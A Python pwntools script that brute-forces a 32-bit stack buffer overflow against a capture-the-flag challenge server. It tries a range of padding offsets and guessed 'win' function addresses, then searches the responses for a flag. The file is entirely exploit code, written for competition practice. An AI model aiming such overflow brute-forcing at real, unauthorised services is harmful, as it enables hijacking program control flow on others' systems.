#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch = 'i386'  # 32-bit binary

host = "chals.uscc-cyberbowl-2025.ctf.institute"
port = 3015

# Common addresses for win function in 32-bit binaries
# Typically in the range 0x08048000 - 0x08049000
win_addresses = [
    0x08048596,  # Common placement
    0x080485a0,
    0x080485b0,
    0x080485c0,
    0x080485d0,
    0x08048580,
    0x08048570,
    0x08048560,
    0x08048550,
]

# Try different offsets
for offset in [16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60, 64, 68, 72, 76, 80]:
    for win_addr in win_addresses[:3]:  # Try first few addresses
        print(f"\n{'='*70}")
        print(f"Trying offset {offset} with win address 0x{win_addr:08x}")
        print(f"{'='*70}")
        
        try:
            conn = remote(host, port, timeout=10)
            
            # Get prompt and send band selection
            conn.recvuntil(b":")
            conn.sendline(b"6")
            
            # Wait for space
            conn.recv(timeout=1)
            
            # Craft payload: padding + win address
            payload = b"A" * offset + p32(win_addr)
            print(f"Payload length: {len(payload)}")
            conn.sendline(payload)
            
            # Get response
            try:
                data = conn.recvall(timeout=3)
                output = data.decode('utf-8', errors='ignore')
                print(f"Response: {output[:200]}")
                
                if 'USCC{' in output or 'RAIDER' in output or 'flag' in output.lower():
                    print("\n" + "!"*70)
                    print("FLAG FOUND!")
                    print(output)
                    print("!"*70)
                    conn.close()
                    exit(0)
            except:
                pass
            
            conn.close()
            
        except Exception as e:
            print(f"Error: {e}")
            continue
